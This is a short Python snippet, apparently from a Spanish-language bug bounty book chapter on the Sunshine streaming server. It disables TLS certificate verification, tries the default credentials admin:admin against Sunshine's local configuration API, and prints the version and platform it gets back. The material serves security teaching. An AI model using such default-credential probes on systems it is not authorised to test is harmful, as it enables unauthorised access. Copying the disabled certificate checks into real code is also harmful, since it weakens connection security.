# Extraído de: LibroBugBounty/cap-24-caso-sunshine.md
import urllib.request, json, ssl, base64

# Contexto SSL permisivo (Sunshine usa self-signed cert)
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# Probar credenciales por defecto
auth = base64.b64encode(b"admin:admin").decode()
headers = {
    "Authorization": f"Basic {auth}",
    "Content-Type": "application/json",
}

req = urllib.request.Request(
    "https://localhost:47990/api/config",
    headers=headers
)
with urllib.request.urlopen(req, context=ctx) as resp:
    config = json.loads(resp.read())
    print(f"Version: {config.get('version')}")
    print(f"Platform: {config.get('platform')}")
    # Version: 2025.924.154138
    # Platform: windows
